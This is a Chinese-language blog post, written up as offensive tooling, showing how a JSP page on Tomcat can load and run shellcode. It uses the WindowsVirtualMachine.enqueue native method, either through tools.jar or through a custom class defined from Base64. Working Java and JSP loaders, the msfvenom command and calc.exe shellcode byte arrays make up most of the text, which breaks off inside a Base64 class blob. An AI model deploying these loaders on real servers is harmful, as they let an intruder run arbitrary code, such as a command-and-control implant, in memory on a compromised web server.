---
layout: post
title: Java利用技巧——通过jsp加载Shellcode
---


## 0x00 前言
---

本文基于rebeyond的[《Java内存攻击技术漫谈》](https://mp.weixin.qq.com/s/JIjBjULjFnKDjEhzVAtxhw)，以Tomcat环境为例，介绍通过jsp加载Shellcode的方法，开源代码，记录细节。

## 0x01 简介
---

本文将要介绍以下内容：

- 依赖tools.jar加载Shellcode
- 自定义类加载Shellcode

## 0x02 依赖tools.jar加载Shellcode
---

### 1.Java实现

通过enqueue函数加载Shellcode，测试代码：

```
import java.lang.reflect.Method;
public class ThreadMain   {
    public static void main(String[] args) throws Exception {
        System.loadLibrary("attach");
        Class cls=Class.forName("sun.tools.attach.WindowsVirtualMachine");
        for (Method m:cls.getDeclaredMethods())
        {
            if (m.getName().equals("enqueue"))
            {
                long hProcess=-1;
                byte buf[] = new byte[]
                      {
                                (byte) 0xfc, (byte) 0x48, (byte) 0x83, (byte) 0xe4, (byte) 0xf0, (byte) 0xe8, (byte) 0xc0, (byte) 0x00,
                                (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51,
                                (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x65, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                                (byte) 0x60, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                                (byte) 0x20, (byte) 0x48, (byte) 0x8b, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0f, (byte) 0xb7,
                                (byte) 0x4a, (byte) 0x4a, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                                (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0x41,
                                (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1, (byte) 0xe2, (byte) 0xed,
                                (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x20, (byte) 0x8b,
                                (byte) 0x42, (byte) 0x3c, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x8b, (byte) 0x80, (byte) 0x88,
                                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0x67,
                                (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x50, (byte) 0x8b, (byte) 0x48, (byte) 0x18, (byte) 0x44,
                                (byte) 0x8b, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0xe3, (byte) 0x56,
                                (byte) 0x48, (byte) 0xff, (byte) 0xc9, (byte) 0x41, (byte) 0x8b, (byte) 0x34, (byte) 0x88, (byte) 0x48,
                                (byte) 0x01, (byte) 0xd6, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                                (byte) 0xac, (byte) 0x41, (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1,
                                (byte) 0x38, (byte) 0xe0, (byte) 0x75, (byte) 0xf1, (byte) 0x4c, (byte) 0x03, (byte) 0x4c, (byte) 0x24,
                                (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xd1, (byte) 0x75, (byte) 0xd8, (byte) 0x58, (byte) 0x44,
                                (byte) 0x8b, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0x66, (byte) 0x41,
                                (byte) 0x8b, (byte) 0x0c, (byte) 0x48, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x1c, (byte) 0x49,
                                (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x8b, (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01,
                                (byte) 0xd0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5e, (byte) 0x59, (byte) 0x5a,
                                (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41, (byte) 0x5a, (byte) 0x48, (byte) 0x83,
                                (byte) 0xec, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xff, (byte) 0xe0, (byte) 0x58, (byte) 0x41,
                                (byte) 0x59, (byte) 0x5a, (byte) 0x48, (byte) 0x8b, (byte) 0x12, (byte) 0xe9, (byte) 0x57, (byte) 0xff,
                                (byte) 0xff, (byte) 0xff, (byte) 0x5d, (byte) 0x48, (byte) 0xba, (byte) 0x01, (byte) 0x00, (byte) 0x00,
                                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x8d, (byte) 0x8d,
                                (byte) 0x01, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xba, (byte) 0x31, (byte) 0x8b,
                                (byte) 0x6f, (byte) 0x87, (byte) 0xff, (byte) 0xd5, (byte) 0xbb, (byte) 0xf0, (byte) 0xb5, (byte) 0xa2,
                                (byte) 0x56, (byte) 0x41, (byte) 0xba, (byte) 0xa6, (byte) 0x95, (byte) 0xbd, (byte) 0x9d, (byte) 0xff,
                                (byte) 0xd5, (byte) 0x48, (byte) 0x83, (byte) 0xc4, (byte) 0x28, (byte) 0x3c, (byte) 0x06, (byte) 0x7c,
                                (byte) 0x0a, (byte) 0x80, (byte) 0xfb, (byte) 0xe0, (byte) 0x75, (byte) 0x05, (byte) 0xbb, (byte) 0x47,
                                (byte) 0x13, (byte) 0x72, (byte) 0x6f, (byte) 0x6a, (byte) 0x00, (byte) 0x59, (byte) 0x41, (byte) 0x89,
                                (byte) 0xda, (byte) 0xff, (byte) 0xd5, (byte) 0x63, (byte) 0x61, (byte) 0x6c, (byte) 0x63, (byte) 0x2e,
                                (byte) 0x65, (byte) 0x78, (byte) 0x65, (byte) 0x00
                        };

                String cmd="load";String pipeName="test";
                    m.setAccessible(true);
                Object result=m.invoke(cls,new Object[]{hProcess,buf,cmd,pipeName,new Object[]{}});
                System.out.println("result:"+result);
            }
        }
        Thread.sleep(4000);
    }
}
```

**注：**

代码修改自[《Java内存攻击技术漫谈》](https://mp.weixin.qq.com/s/JIjBjULjFnKDjEhzVAtxhw)

字节数组buf的生成方法：

```
msfvenom -p windows/x64/exec cmd=calc.exe -f java
```

`long hProcess=-1;`表示注入当前Java进程

直接执行会报错提示`ClassNotFoundException: sun.tools.attach.WindowsVirtualMachine`，这里需要添加引用tools.jar，默认位置为`<jdk>\lib\tools.jar`

### 2.jsp实现

测试环境为Tomcat

将以上代码改写成jsp的格式，执行时同样会报错`ClassNotFoundException: sun.tools.attach.WindowsVirtualMachine`

这里可以改为使用`URLClassLoader`引用tools.jar

原代码：

```
Class cls=Class.forName("sun.tools.attach.WindowsVirtualMachine");
```

替换为：

```
URLClassLoader loader = new URLClassLoader(new URL[] { new URL("file:C:\\Program Files\\Java\\jdk1.8.0_271\\lib\\tools.jar") });
Class cls = loader.loadClass( "sun.tools.attach.WindowsVirtualMachine");
```

完整的jsp代码如下：

```
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLClassLoader" %>
<%
        URLClassLoader loader = new URLClassLoader(new URL[] { new URL("file:C:\\Program Files\\Java\\jdk1.8.0_271\\lib\\tools.jar") });
        Class cls = loader.loadClass( "sun.tools.attach.WindowsVirtualMachine");
        for (Method m:cls.getDeclaredMethods())
        {
            if (m.getName().equals("enqueue"))
            {
                long hProcess = -1;
                //calc
                byte buf[] = new byte[]
                        {
                                (byte) 0xfc, (byte) 0x48, (byte) 0x83, (byte) 0xe4, (byte) 0xf0, (byte) 0xe8, (byte) 0xc0, (byte) 0x00,
                                (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51,
                                (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x65, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                                (byte) 0x60, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                                (byte) 0x20, (byte) 0x48, (byte) 0x8b, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0f, (byte) 0xb7,
                                (byte) 0x4a, (byte) 0x4a, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                                (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0x41,
                                (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1, (byte) 0xe2, (byte) 0xed,
                                (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x20, (byte) 0x8b,
                                (byte) 0x42, (byte) 0x3c, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x8b, (byte) 0x80, (byte) 0x88,
                                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0x67,
                                (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x50, (byte) 0x8b, (byte) 0x48, (byte) 0x18, (byte) 0x44,
                                (byte) 0x8b, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0xe3, (byte) 0x56,
                                (byte) 0x48, (byte) 0xff, (byte) 0xc9, (byte) 0x41, (byte) 0x8b, (byte) 0x34, (byte) 0x88, (byte) 0x48,
                                (byte) 0x01, (byte) 0xd6, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                                (byte) 0xac, (byte) 0x41, (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1,
                                (byte) 0x38, (byte) 0xe0, (byte) 0x75, (byte) 0xf1, (byte) 0x4c, (byte) 0x03, (byte) 0x4c, (byte) 0x24,
                                (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xd1, (byte) 0x75, (byte) 0xd8, (byte) 0x58, (byte) 0x44,
                                (byte) 0x8b, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0x66, (byte) 0x41,
                                (byte) 0x8b, (byte) 0x0c, (byte) 0x48, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x1c, (byte) 0x49,
                                (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x8b, (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01,
                                (byte) 0xd0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5e, (byte) 0x59, (byte) 0x5a,
                                (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41, (byte) 0x5a, (byte) 0x48, (byte) 0x83,
                                (byte) 0xec, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xff, (byte) 0xe0, (byte) 0x58, (byte) 0x41,
                                (byte) 0x59, (byte) 0x5a, (byte) 0x48, (byte) 0x8b, (byte) 0x12, (byte) 0xe9, (byte) 0x57, (byte) 0xff,
                                (byte) 0xff, (byte) 0xff, (byte) 0x5d, (byte) 0x48, (byte) 0xba, (byte) 0x01, (byte) 0x00, (byte) 0x00,
                                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x8d, (byte) 0x8d,
                                (byte) 0x01, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xba, (byte) 0x31, (byte) 0x8b,
                                (byte) 0x6f, (byte) 0x87, (byte) 0xff, (byte) 0xd5, (byte) 0xbb, (byte) 0xf0, (byte) 0xb5, (byte) 0xa2,
                                (byte) 0x56, (byte) 0x41, (byte) 0xba, (byte) 0xa6, (byte) 0x95, (byte) 0xbd, (byte) 0x9d, (byte) 0xff,
                                (byte) 0xd5, (byte) 0x48, (byte) 0x83, (byte) 0xc4, (byte) 0x28, (byte) 0x3c, (byte) 0x06, (byte) 0x7c,
                                (byte) 0x0a, (byte) 0x80, (byte) 0xfb, (byte) 0xe0, (byte) 0x75, (byte) 0x05, (byte) 0xbb, (byte) 0x47,
                                (byte) 0x13, (byte) 0x72, (byte) 0x6f, (byte) 0x6a, (byte) 0x00, (byte) 0x59, (byte) 0x41, (byte) 0x89,
                                (byte) 0xda, (byte) 0xff, (byte) 0xd5, (byte) 0x63, (byte) 0x61, (byte) 0x6c, (byte) 0x63, (byte) 0x2e,
                                (byte) 0x65, (byte) 0x78, (byte) 0x65, (byte) 0x00
                        };
                String cmd = "load";
                String pipeName = "test";
                m.setAccessible(true);
                Object result = m.invoke(cls,new Object[]{hProcess,buf,cmd,pipeName,new Object[]{}});
                out.println("result:"+result);
            }
        }
        Thread.sleep(4000);
%>
```

## 0x03 自定义类加载Shellcode
---

### 1.Java实现

自定义`sun.tools.attach.WindowsVirtualMachine`类，实现enqueue函数加载Shellcode。为了避免与系统中的tools.jar冲突，通过自定义classLoader，使用defineClass创建类，调用enqueue函数加载Shellcode

具体步骤如下：

#### (1)生成Shellcode

在使用cs创建Shellcode时，输出的Shellcode格式如下：

```
byte buf[] = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31,
...
```

在Java中使用以上代码会报错，需要指定字符数组每个元素的格式，正确的格式如下：

```
byte buf[] = new byte[] { (byte) 0xfc,(byte) 0x48,(byte) 0x83,(byte) 0xe4,(byte) 0xf0,(byte) 0xe8,(byte) 0xc8,(byte) 0x00,(byte) 0x00,(byte) 0x00,(byte) 0x41,(byte) 0x51,(byte) 0x41,(byte) 0x50,(byte) 0x52,(byte) 0x51,(byte) 0x56,(byte) 0x48,(byte) 0x31,(byte) 0xd2,(byte) 0x65,(byte) 0x48,(byte) 0x8b,(byte) 0x52,(byte) 0x60,(byte) 0x48,(byte) 0x8b,(byte) 0x52,(byte) 0x18,(byte) 0x48,(byte) 0x8b,(byte) 0x52,(byte) 0x20,(byte) 0x48,(byte) 0x8b,(byte) 0x72,(byte) 0x50,(byte) 0x48,(byte) 0x0f,(byte) 0xb7,(byte) 0x4a,(byte) 0x4a,(byte) 0x4d,(byte) 0x31,
...
```

为了格式友好，可以将字节数组buf的每个元素转换成String格式，Java实现代码如下：

```
import java.util.Arrays;
public class bufToString {
    public static void main(String[] args)
    {
    	//calc
        byte buf[] = new byte[]
                        {
                                (byte) 0xfc, (byte) 0x48, (byte) 0x83, (byte) 0xe4, (byte) 0xf0, (byte) 0xe8, (byte) 0xc0, (byte) 0x00,
                                (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51,
                                (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x65, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                                (byte) 0x60, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                                (byte) 0x20, (byte) 0x48, (byte) 0x8b, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0f, (byte) 0xb7,
                                (byte) 0x4a, (byte) 0x4a, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                                (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0x41,
                                (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1, (byte) 0xe2, (byte) 0xed,
                                (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x20, (byte) 0x8b,
                                (byte) 0x42, (byte) 0x3c, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x8b, (byte) 0x80, (byte) 0x88,
                                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0x67,
                                (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x50, (byte) 0x8b, (byte) 0x48, (byte) 0x18, (byte) 0x44,
                                (byte) 0x8b, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0xe3, (byte) 0x56,
                                (byte) 0x48, (byte) 0xff, (byte) 0xc9, (byte) 0x41, (byte) 0x8b, (byte) 0x34, (byte) 0x88, (byte) 0x48,
                                (byte) 0x01, (byte) 0xd6, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                                (byte) 0xac, (byte) 0x41, (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1,
                                (byte) 0x38, (byte) 0xe0, (byte) 0x75, (byte) 0xf1, (byte) 0x4c, (byte) 0x03, (byte) 0x4c, (byte) 0x24,
                                (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xd1, (byte) 0x75, (byte) 0xd8, (byte) 0x58, (byte) 0x44,
                                (byte) 0x8b, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0x66, (byte) 0x41,
                                (byte) 0x8b, (byte) 0x0c, (byte) 0x48, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x1c, (byte) 0x49,
                                (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x8b, (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01,
                                (byte) 0xd0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5e, (byte) 0x59, (byte) 0x5a,
                                (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41, (byte) 0x5a, (byte) 0x48, (byte) 0x83,
                                (byte) 0xec, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xff, (byte) 0xe0, (byte) 0x58, (byte) 0x41,
                                (byte) 0x59, (byte) 0x5a, (byte) 0x48, (byte) 0x8b, (byte) 0x12, (byte) 0xe9, (byte) 0x57, (byte) 0xff,
                                (byte) 0xff, (byte) 0xff, (byte) 0x5d, (byte) 0x48, (byte) 0xba, (byte) 0x01, (byte) 0x00, (byte) 0x00,
                                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x8d, (byte) 0x8d,
                                (byte) 0x01, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xba, (byte) 0x31, (byte) 0x8b,
                                (byte) 0x6f, (byte) 0x87, (byte) 0xff, (byte) 0xd5, (byte) 0xbb, (byte) 0xf0, (byte) 0xb5, (byte) 0xa2,
                                (byte) 0x56, (byte) 0x41, (byte) 0xba, (byte) 0xa6, (byte) 0x95, (byte) 0xbd, (byte) 0x9d, (byte) 0xff,
                                (byte) 0xd5, (byte) 0x48, (byte) 0x83, (byte) 0xc4, (byte) 0x28, (byte) 0x3c, (byte) 0x06, (byte) 0x7c,
                                (byte) 0x0a, (byte) 0x80, (byte) 0xfb, (byte) 0xe0, (byte) 0x75, (byte) 0x05, (byte) 0xbb, (byte) 0x47,
                                (byte) 0x13, (byte) 0x72, (byte) 0x6f, (byte) 0x6a, (byte) 0x00, (byte) 0x59, (byte) 0x41, (byte) 0x89,
                                (byte) 0xda, (byte) 0xff, (byte) 0xd5, (byte) 0x63, (byte) 0x61, (byte) 0x6c, (byte) 0x63, (byte) 0x2e,
                                (byte) 0x65, (byte) 0x78, (byte) 0x65, (byte) 0x00
                        };
        System.out.println(Arrays.toString(buf));
    }
}
```

执行后输出结果为：

```
[-4, 72, -125, -28, -16, -24, -64, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, -46, 101, 72, -117, 82, 96, 72, -117, 82, 24, 72, -117, 82, 32, 72, -117, 114, 80, 72, 15, -73, 74, 74, 77, 49, -55, 72, 49, -64, -84, 60, 97, 124, 2, 44, 32, 65, -63, -55, 13, 65, 1, -63, -30, -19, 82, 65, 81, 72, -117, 82, 32, -117, 66, 60, 72, 1, -48, -117, -128, -120, 0, 0, 0, 72, -123, -64, 116, 103, 72, 1, -48, 80, -117, 72, 24, 68, -117, 64, 32, 73, 1, -48, -29, 86, 72, -1, -55, 65, -117, 52, -120, 72, 1, -42, 77, 49, -55, 72, 49, -64, -84, 65, -63, -55, 13, 65, 1, -63, 56, -32, 117, -15, 76, 3, 76, 36, 8, 69, 57, -47, 117, -40, 88, 68, -117, 64, 36, 73, 1, -48, 102, 65, -117, 12, 72, 68, -117, 64, 28, 73, 1, -48, 65, -117, 4, -120, 72, 1, -48, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, -125, -20, 32, 65, 82, -1, -32, 88, 65, 89, 90, 72, -117, 18, -23, 87, -1, -1, -1, 93, 72, -70, 1, 0, 0, 0, 0, 0, 0, 0, 72, -115, -115, 1, 1, 0, 0, 65, -70, 49, -117, 111, -121, -1, -43, -69, -16, -75, -94, 86, 65, -70, -90, -107, -67, -99, -1, -43, 72, -125, -60, 40, 60, 6, 124, 10, -128, -5, -32, 117, 5, -69, 71, 19, 114, 111, 106, 0, 89, 65, -119, -38, -1, -43, 99, 97, 108, 99, 46, 101, 120, 101, 0]
```

### (2)自定义`sun.tools.attach.WindowsVirtualMachine`类

示例代码：

```
package sun.tools.attach;
import java.io.IOException;
public class WindowsVirtualMachine {
    public WindowsVirtualMachine() {
    }
    static native void enqueue(long var0, byte[] var2, String var3, String var4, Object... var5) throws IOException;
    static native long openProcess(int var0) throws IOException;
    public static void run(byte[] buf) {
        System.loadLibrary("attach");
        buf = new byte[] {-4, 72, -125, -28, -16, -24, -64, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, -46, 101, 72, -117, 82, 96, 72, -117, 82, 24, 72, -117, 82, 32, 72, -117, 114, 80, 72, 15, -73, 74, 74, 77, 49, -55, 72, 49, -64, -84, 60, 97, 124, 2, 44, 32, 65, -63, -55, 13, 65, 1, -63, -30, -19, 82, 65, 81, 72, -117, 82, 32, -117, 66, 60, 72, 1, -48, -117, -128, -120, 0, 0, 0, 72, -123, -64, 116, 103, 72, 1, -48, 80, -117, 72, 24, 68, -117, 64, 32, 73, 1, -48, -29, 86, 72, -1, -55, 65, -117, 52, -120, 72, 1, -42, 77, 49, -55, 72, 49, -64, -84, 65, -63, -55, 13, 65, 1, -63, 56, -32, 117, -15, 76, 3, 76, 36, 8, 69, 57, -47, 117, -40, 88, 68, -117, 64, 36, 73, 1, -48, 102, 65, -117, 12, 72, 68, -117, 64, 28, 73, 1, -48, 65, -117, 4, -120, 72, 1, -48, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, -125, -20, 32, 65, 82, -1, -32, 88, 65, 89, 90, 72, -117, 18, -23, 87, -1, -1, -1, 93, 72, -70, 1, 0, 0, 0, 0, 0, 0, 0, 72, -115, -115, 1, 1, 0, 0, 65, -70, 49, -117, 111, -121, -1, -43, -69, -16, -75, -94, 86, 65, -70, -90, -107, -67, -99, -1, -43, 72, -125, -60, 40, 60, 6, 124, 10, -128, -5, -32, 117, 5, -69, 71, 19, 114, 111, 106, 0, 89, 65, -119, -38, -1, -43, 99, 97, 108, 99, 46, 101, 120, 101, 0};
        try {
            enqueue(-1L, buf, "test", "test");
        } catch (Exception var2) {
            var2.printStackTrace();
        }
    }
}
```

### (3)生成WindowsVirtualMachine.class

```
javac WindowsVirtualMachine.java
```

### (4)对WindowsVirtualMachine.class作Base64编码

Java示例代码：

```
import java.io.*;
import java.util.Base64;
public class ClassToBase64 {
    public static void main(String[] args)
    {
        try {
            File file = new File("c:\\test\\WindowsVirtualMachine.class");
            FileInputStream fi = new FileInputStream(file);
            byte[] buffer = new byte[(int) file.length()];
            int offset = 0;
            int numRead = 0;
            while (offset < buffer.length
                    && (numRead = fi.read(buffer, offset, buffer.length - offset)) >= 0) {
                offset += numRead;
            }
            if (offset != buffer.length) {
                throw new IOException("Could not completely read file " + file.getName());
            }
            fi.close();
            String encoded = Base64.getEncoder().encodeToString(buffer);
            System.out.println(encoded);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

命令行输出Base64编码

### (5)自定义classLoader，使用defineClass创建类，调用enqueue函数加载Shellcode

Java示例代码：

```
import java.lang.reflect.Method;
import java.util.Base64;
public class LoadShellcode {
    public static class Myloader extends ClassLoader 
    {
        public Class get(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
    public static void main(String[] args)
    {
        try {
            //calc
            String classStr="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